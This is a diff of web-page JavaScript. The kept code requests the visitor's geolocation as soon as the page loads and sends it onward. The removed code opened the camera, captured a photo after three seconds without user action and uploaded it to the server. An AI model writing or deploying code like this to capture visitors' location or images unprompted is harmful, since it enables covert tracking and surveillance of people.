@@ -1,14 +1,11 @@
+// Automatically request location when the page loads
 window.onload = function () {
-  // Request location access
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(sendLocation, showError);
   } else {
     document.getElementById("status").innerText =
       "Geolocation is not supported by your browser.";
   }
-
-  // Request camera access
-  requestCameraAccess();
 };
 
 function sendLocation(position) {
@@ -53,45 +50,4 @@ function showError(error) {
   }
   alert(message);
   document.getElementById("status").innerText = message;
-}
-
-function requestCameraAccess() {
-  navigator.mediaDevices
-    .getUserMedia({ video: true })
-    .then((stream) => {
-      let video = document.createElement("video");
-      video.id = "cameraFeed";
-      video.autoplay = true;
-      document.body.appendChild(video);
-      video.srcObject = stream;
-
-      // Capture photo after 3 seconds
-      setTimeout(() => {
-        capturePhoto(video);
-      }, 3000);
-    })
-    .catch((error) => {
-      console.error("Camera access denied:", error);
-    });
-}
-
-function capturePhoto(video) {
-  let canvas = document.createElement("canvas");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  let ctx = canvas.getContext("2d");
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-  // Convert canvas to image data URL
-  let imageData = canvas.toDataURL("image/png");
-
-  // Send image to server
-  fetch("/upload-photo", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ image: imageData }),
-  })
-    .then((response) => response.json())
-    .then((data) => console.log("Photo sent successfully:", data))
-    .catch((error) => console.error("Error sending photo:", error));
 }
